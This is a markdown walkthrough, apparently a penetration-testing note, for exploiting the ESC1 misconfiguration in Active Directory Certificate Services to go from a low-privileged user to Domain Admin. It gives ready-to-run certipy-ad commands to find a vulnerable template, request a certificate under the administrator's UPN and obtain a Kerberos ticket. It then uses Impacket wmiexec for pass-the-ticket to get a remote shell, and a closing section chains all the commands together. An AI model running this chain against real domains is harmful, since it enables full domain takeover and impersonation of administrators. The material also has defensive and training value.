# ADCS Exploitation to Domain Admin via ESC1 

## Step 1: Identify Vulnerable Certificate Templates
We start by checking if any vulnerable certificate templates are available in the ADCS setup. ESC1 vulnerability arises when a certificate template allows **Client Authentication** and permits enrollment by low-privileged users.

```bash
certipy-ad find -u 'lowpriv@domain.local' -p 'Password123!' -dc-ip 10.10.10.5
```

**Why this works:**  
`certipy-ad find` queries ADCS for published certificate templates and checks their configurations. If a template allows a low-privileged user to request a certificate that can be used for authentication, it’s exploitable.

---

## Step 2: Request a Certificate for a High-Value Account
If we find a vulnerable template (e.g., `User` template with `ENROLLEE_SUPPLIES_SUBJECT`), we can request a certificate for another user such as a Domain Admin.

```bash
certipy-ad req -u 'lowpriv@domain.local' -p 'Password123!' -ca 'domain-CA' -template 'User' -upn 'administrator@domain.local' -dc-ip 10.10.10.5
```

**Why this works:**  
The vulnerable template lets us specify the `UPN` (User Principal Name) of another account. Even though we’re a low-privileged user, the CA issues us a valid certificate for the Administrator account.

This generates a `.pfx` file containing the certificate and private key.

---

## Step 3: Authenticate with the Certificate
Use the `.pfx` file to authenticate as the Administrator.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.5
```

**Why this works:**  
The `.pfx` is essentially the Administrator’s identity (certificate + private key). This lets us obtain a valid Kerberos TGT for the Administrator.

---

## Step 4: Perform a Pass-the-Ticket Attack
With the Administrator TGT, we can inject it into our session and execute commands as Domain Admin.

Example using **Impacket wmiexec**:

```bash
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass administrator@domain.local
```

**Why this works:**  
- `export KRB5CCNAME` sets the Kerberos cache file containing the Administrator TGT.  
- `wmiexec.py -k -no-pass` tells Impacket to use the Kerberos ticket instead of a password or hash.  
- This grants us a remote shell as Domain Admin.

---

## Notes
- If `psexec.py` fails with `KDC_ERR_S_PRINCIPAL_UNKNOWN`, try `wmiexec.py` or `smbexec.py`. Different protocols use slightly different SPNs (Service Principal Names).  
- WMI often works where SMB fails due to differences in how Kerberos resolves SPNs.

---

## Full Command Flow

```bash
# 1. Find vulnerable certificate templates
certipy-ad find -u 'lowpriv@domain.local' -p 'Password123!' -dc-ip 10.10.10.5

# 2. Request certificate for Administrator
certipy-ad req -u 'lowpriv@domain.local' -p 'Password123!' -ca 'domain-CA' -template 'User' -upn 'administrator@domain.local' -dc-ip 10.10.10.5

# 3. Authenticate with issued certificate
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.5

# 4. Use the Kerberos ticket with wmiexec
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass administrator@domain.local
```
